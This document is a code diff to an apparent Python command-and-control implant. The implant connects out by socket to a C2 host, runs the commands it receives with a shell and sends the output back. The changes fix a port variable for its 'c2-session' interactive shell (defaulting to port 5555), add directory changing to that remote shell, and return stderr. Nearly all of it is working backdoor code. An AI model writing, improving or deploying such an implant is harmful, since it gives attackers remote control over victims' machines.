@@ -5,6 +5,7 @@ import base64
 import socket
 import struct
 from time import sleep
+import os
 
 is_base64_enabled = True
 
@@ -47,6 +48,7 @@ def sessions_shell():
     # give a few tries to connect in case of errors
     for i in range(5):
         try:
+            global sessions_port
 
             client_socket = socket.socket()
             client_socket.connect((sessions_host, sessions_port))
@@ -54,7 +56,7 @@ def sessions_shell():
             break
 
         except Exception as ex:
-            print(f"Failed on socket creation: {ex}")
+            print(f"Failed on socket creation on port {sessions_port} : {ex}")
             # give some time if the server is down
             sleep(5)
 
@@ -112,8 +114,20 @@ def sessions_shell():
                 command = " ".join(cmd.split()[2:])
                 print(f"command: {command}")
 
-                output = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-                result = output.stdout + output.stderr
+                if command[:2] == 'cd':
+                    dir = command[3:]
+                    print(f'dir: {dir}')
+                    try:
+                        os.chdir(dir.strip())
+                        result = b""
+                    except Exception as ex:
+                        result = str.encode(str(ex))
+                        print(f'exception on chdir: {ex}')
+                
+                else:
+                    output = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+                    result = output.stdout + output.stderr
+                    
                 print("result: ",result)
 
                 send_msg(client_socket, result)
@@ -209,13 +223,17 @@ while True:
                 command = ' '.join(cmd[1:])
                 result = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)                
                 #result.wait()
-                output = result.stdout.decode("utf-8")                
-                post_results(output)           
+                output = result.stdout + result.stderr
+                # output = result.stdout.decode("utf-8")                
+                post_results(output.decode("utf-8") )           
             elif cmd[0] == "c2-session":
-                try:
-                    server_port = int(' '.join(cmd[1:]))
+                try:                    
+                    sessions_port = int(' '.join(cmd[1:]))
+                    print(f'server_port: {sessions_port}')
                 except Exception as ex:
-                    print("Not a valid number")
+                    sessions_port = 5555
+                    print(f"Not a valid server port, defaulting to: {sessions_port}")
+                    
                 sessions_shell()
                 #post_results(output)        
             
